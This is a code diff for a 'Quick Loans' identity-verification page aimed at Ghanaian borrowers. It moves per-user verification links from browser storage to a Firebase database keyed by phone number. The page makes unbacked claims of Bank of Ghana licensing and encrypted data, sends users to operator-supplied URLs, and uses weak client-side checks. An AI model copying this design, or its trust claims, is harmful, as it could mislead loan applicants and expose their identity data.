@@ -9,6 +9,9 @@
     <meta name="theme-color" content="#E30613">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Firebase SDK (compat) -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
     <style>
         * {
             margin: 0;
@@ -398,26 +401,21 @@
     </header>
 
     <main class="card" id="mainCard">
-        <!-- Icon -->
         <div class="icon-circle">
             <i class="fas fa-id-card"></i>
         </div>
 
-        <!-- Title -->
         <h1 class="card-title" id="pageTitle">Verify Your Identity</h1>
 
-        <!-- Status Badge -->
         <div class="status-badge pending" id="statusBadge">
             <i class="fas fa-clock" style="margin-right: 6px;"></i> Pending Verification
         </div>
 
-        <!-- Error box -->
         <div class="error-box" id="errorBox">
             <i class="fas fa-exclamation-circle"></i>
             <span id="errorText">No verification link available.</span>
         </div>
 
-        <!-- Message -->
         <p class="card-subtitle" id="messageText">
             To complete your loan application and receive your funds, you need to verify your identity.
         </p>
@@ -426,10 +424,8 @@
             Please have your <strong>Ghana Card</strong> or <strong>Voter ID</strong> ready for verification.
         </p>
 
-        <!-- Divider -->
         <div class="divider"></div>
 
-        <!-- Summary Details -->
         <div class="details-grid">
             <div class="detail-row">
                 <span class="detail-label">Full Name</span>
@@ -449,16 +445,13 @@
             </div>
         </div>
 
-        <!-- Divider -->
         <div class="divider"></div>
 
-        <!-- Call to action -->
         <p class="card-subtitle" style="font-size: 13px; color: #888;" id="securityNote">
             <i class="fas fa-shield-alt" style="color: var(--primary-red); margin-right: 6px;"></i>
             Your information is secure and encrypted.
         </p>
 
-        <!-- Buttons -->
         <div class="btn-group">
             <button class="btn btn-verify" id="verifyBtn">
                 <i class="fas fa-check-circle" style="margin-right: 8px;"></i> Verify Identity
@@ -477,14 +470,30 @@
         © 2026 Quick Loans – Licensed by Bank of Ghana | Powered by secure mobile payments
     </footer>
 
-    <!-- Spinner overlay -->
     <div id="spinner">
         <div class="spinner-loader"></div>
     </div>
 
     <script>
         // ============================================================
-        // 1. Load user data
+        // FIREBASE CONFIGURATION (from your project)
+        // ============================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyBqt0UDmHTxPAn33auTapQ-J1R5qf-YfRQ",
+            authDomain: "gh-olans.firebaseapp.com",
+            projectId: "gh-olans",
+            storageBucket: "gh-olans.firebasestorage.app",
+            messagingSenderId: "1021665968096",
+            appId: "1:1021665968096:web:23fbf673547e65d48ef585",
+            measurementId: "G-P0KHN55TRL",
+            databaseURL: "https://gh-olans-default-rtdb.firebaseio.com/" // IMPORTANT: add this line
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // ============================================================
+        // 1. Load user data from localStorage
         // ============================================================
 
         const fullName = sessionStorage.getItem('fullName') ||
@@ -505,44 +514,20 @@
             `${guarantorFirstName} ${guarantorLastName}`.trim() :
             'Not provided';
 
-        // Format currency
         function formatCurrency(amount) {
             return '₵' + parseFloat(amount).toLocaleString('en-US');
         }
 
-        // Display values
         document.getElementById('displayName').textContent = fullName;
         document.getElementById('displayPhone').textContent = phone || 'Not provided';
         document.getElementById('displayAmount').textContent = formatCurrency(loanAmount);
         document.getElementById('displayGuarantor').textContent = guarantorName;
 
         // ============================================================
-        // 2. Get the verification link for this user
+        // 2. Real‑time listener for this user's verification link
         // ============================================================
 
         const currentUserId = phone; // Using phone as unique identifier
-        const links = JSON.parse(localStorage.getItem('veriffLinks') || '{}');
-        const linkData = links[currentUserId] || null;
-
-        // Determine link status
-        let verificationUrl = null;
-        let linkStatus = 'pending'; // pending | active | used | none
-
-        if (linkData) {
-            if (linkData.used === true) {
-                linkStatus = 'used';
-            } else {
-                linkStatus = 'active';
-                verificationUrl = linkData.url;
-            }
-        } else {
-            linkStatus = 'none';
-        }
-
-        // ============================================================
-        // 3. Update UI based on link status
-        // ============================================================
-
         const verifyBtn = document.getElementById('verifyBtn');
         const statusBadge = document.getElementById('statusBadge');
         const errorBox = document.getElementById('errorBox');
@@ -552,9 +537,12 @@
         const idHint = document.getElementById('idHint');
         const infoNote = document.getElementById('infoNote');
         const securityNote = document.getElementById('securityNote');
+        const spinner = document.getElementById('spinner');
 
-        function setStatus(status, message) {
-            // Update badge
+        let verificationUrl = null;
+        let isProcessing = false;
+
+        function setStatus(status) {
             statusBadge.className = 'status-badge';
             if (status === 'active') {
                 statusBadge.classList.add('active');
@@ -562,9 +550,6 @@
             } else if (status === 'used') {
                 statusBadge.classList.add('used');
                 statusBadge.innerHTML = `<i class="fas fa-times-circle" style="margin-right:6px;"></i> Link Already Used`;
-            } else if (status === 'pending') {
-                statusBadge.classList.add('pending');
-                statusBadge.innerHTML = `<i class="fas fa-clock" style="margin-right:6px;"></i> Pending Verification`;
             } else {
                 statusBadge.classList.add('pending');
                 statusBadge.innerHTML = `<i class="fas fa-clock" style="margin-right:6px;"></i> Pending Verification`;
@@ -606,9 +591,10 @@
             showError('This verification link has already been used and cannot be reused.');
         }
 
-        function showActiveLinkState() {
+        function showActiveLinkState(url) {
             setStatus('active');
             hideError();
+            verificationUrl = url;
             verifyBtn.disabled = false;
             verifyBtn.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px;"></i> Verify Identity';
             verifyBtn.className = 'btn btn-verify';
@@ -619,77 +605,62 @@
             infoNote.textContent = "You'll be redirected to our secure verification partner.";
         }
 
-        // Apply the correct state
-        if (linkStatus === 'active') {
-            showActiveLinkState();
-        } else if (linkStatus === 'used') {
-            showUsedLinkState();
+        // Listen for changes to this user's link
+        if (currentUserId) {
+            const linkRef = database.ref('veriffLinks/' + currentUserId);
+            linkRef.on('value', (snapshot) => {
+                const linkData = snapshot.val();
+                if (linkData) {
+                    if (linkData.used) {
+                        showUsedLinkState();
+                    } else {
+                        showActiveLinkState(linkData.url);
+                    }
+                } else {
+                    showNoLinkState();
+                }
+            });
         } else {
             showNoLinkState();
         }
 
         // ============================================================
-        // 4. Verify button handler – one-time use only
+        // 3. Verify button handler – one‑time use
         // ============================================================
 
-        const spinner = document.getElementById('spinner');
-
         verifyBtn.addEventListener('click', function() {
-            if (linkStatus !== 'active' || !verificationUrl) {
+            if (isProcessing) return;
+            if (!verificationUrl) {
                 alert('No valid verification link available.');
                 return;
             }
 
-            // Mark the link as used immediately so it can't be reused
-            const allLinks = JSON.parse(localStorage.getItem('veriffLinks') || '{}');
-            if (allLinks[currentUserId]) {
-                allLinks[currentUserId].used = true;
-                localStorage.setItem('veriffLinks', JSON.stringify(allLinks));
-            }
+            isProcessing = true;
 
-            // Show spinner and disable button
-            spinner.style.display = 'flex';
-            verifyBtn.disabled = true;
+            // Mark the link as used in Firebase
+            database.ref('veriffLinks/' + currentUserId).update({ used: true })
+                .then(() => {
+                    spinner.style.display = 'flex';
+                    verifyBtn.disabled = true;
 
-            // Short delay before redirect
-            setTimeout(() => {
-                window.location.href = verificationUrl;
-            }, 500);
+                    setTimeout(() => {
+                        window.location.href = verificationUrl;
+                    }, 500);
+                })
+                .catch((err) => {
+                    console.error('Error updating link:', err);
+                    alert('Error processing verification. Please try again.');
+                    isProcessing = false;
+                    verifyBtn.disabled = false;
+                });
         });
 
         // ============================================================
-        // 5. Cleanup: remove malformed entries only (preserve used links)
-        // ============================================================
-
-        function cleanupMalformedLinks() {
-            const allLinks = JSON.parse(localStorage.getItem('veriffLinks') || '{}');
-            let changed = false;
-            Object.entries(allLinks).forEach(([userId, data]) => {
-                // Only delete if data is malformed (missing required fields)
-                if (!data || !data.url || typeof data.used === 'undefined') {
-                    delete allLinks[userId];
-                    changed = true;
-                }
-            });
-            if (changed) {
-                localStorage.setItem('veriffLinks', JSON.stringify(allLinks));
-            }
-        }
-        cleanupMalformedLinks();
-
-        // ============================================================
-        // 6. Helper: clear spinner on page load / back navigation
+        // 4. Helper: clear spinner on page load / back navigation
         // ============================================================
 
         window.addEventListener('pageshow', function() {
             spinner.style.display = 'none';
-            // Re-check state in case user came back
-            const refreshedLinks = JSON.parse(localStorage.getItem('veriffLinks') || '{}');
-            const refreshedData = refreshedLinks[currentUserId] || null;
-            if (refreshedData && refreshedData.used === true) {
-                // Link was used, refresh UI
-                location.reload();
-            }
         });
     </script>
 
